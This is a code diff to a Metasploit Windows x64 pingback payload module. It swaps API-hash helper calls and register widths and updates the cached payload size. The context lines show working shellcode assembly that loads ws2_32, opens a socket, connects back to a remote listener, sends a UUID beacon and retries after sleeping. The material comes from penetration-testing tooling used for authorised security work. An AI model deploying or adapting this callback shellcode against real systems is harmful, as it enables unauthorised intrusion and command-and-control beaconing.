@@ -4,7 +4,7 @@
 ##
 
 module MetasploitModule
-  CachedSize = 425
+  CachedSize = 422
 
   include Msf::Payload::Windows
   include Msf::Payload::Single
@@ -168,14 +168,14 @@ module MetasploitModule
 
         ; perform the call to LoadLibraryA...
           mov rcx, r14            ; set the param for the library to load
-          mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+          mov r10d, #{block_api_hash('kernel32.dll', 'LoadLibraryA')}
           call rbp                ; LoadLibraryA( "ws2_32" )
 
         ; perform the call to WSAStartup...
           mov rdx, r13            ; second param is a pointer to this struct
           push 0x0101             ;
           pop rcx                 ; set the param for the version requested
-          mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
+          mov r10d, #{block_api_hash('ws2_32.dll', 'WSAStartup')}
           call rbp                ; WSAStartup( 0x0101, &WSAData );
 
         ; stick the retry count on the stack and store it
@@ -194,7 +194,7 @@ module MetasploitModule
           mov rdx, rax            ; push SOCK_STREAM
           inc rax                 ;
           mov rcx, rax            ; push AF_INET
-          mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
+          mov r10d, #{block_api_hash('ws2_32.dll', 'WSASocketA')}
           call rbp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
           mov rdi, rax            ; save the socket for later
 
@@ -204,7 +204,7 @@ module MetasploitModule
           pop r8                  ; pop off the third param
           mov rdx, r12            ; set second param to pointer to sockaddr struct
           mov rcx, rdi            ; the socket
-          mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}
+          mov r10d, #{block_api_hash('ws2_32.dll', 'connect')}
           call rbp                ; connect( s, &sockaddr, 16 );
 
           test eax, eax           ; non-zero means failure
@@ -233,12 +233,12 @@ module MetasploitModule
         get_pingback_address:
           pop rdx                ; PINGBACK UUID address
           mov rcx, rdi           ; Socket handle
-          mov r10, #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}
+          mov r10d, #{block_api_hash('ws2_32.dll', 'send')}
           call rbp               ; call send
 
         close_socket:
           mov rcx, rdi           ; Socket handle
-          mov r10, #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
+          mov r10d, #{block_api_hash('ws2_32.dll', 'closesocket')}
           call rbp               ; call closesocket
         ^
     if pingback_count > 0
@@ -249,7 +249,7 @@ module MetasploitModule
             dec r15               ;decrement the pingback retry counter
             push #{pingback_sleep * 1000}            ; 10 seconds
             pop rcx               ; set the sleep function parameter
-            mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
+            mov r10d, #{block_api_hash('kernel32.dll', 'Sleep')}
             call rbp              ; Sleep()
             jmp create_socket     ; repeat callback
         ^
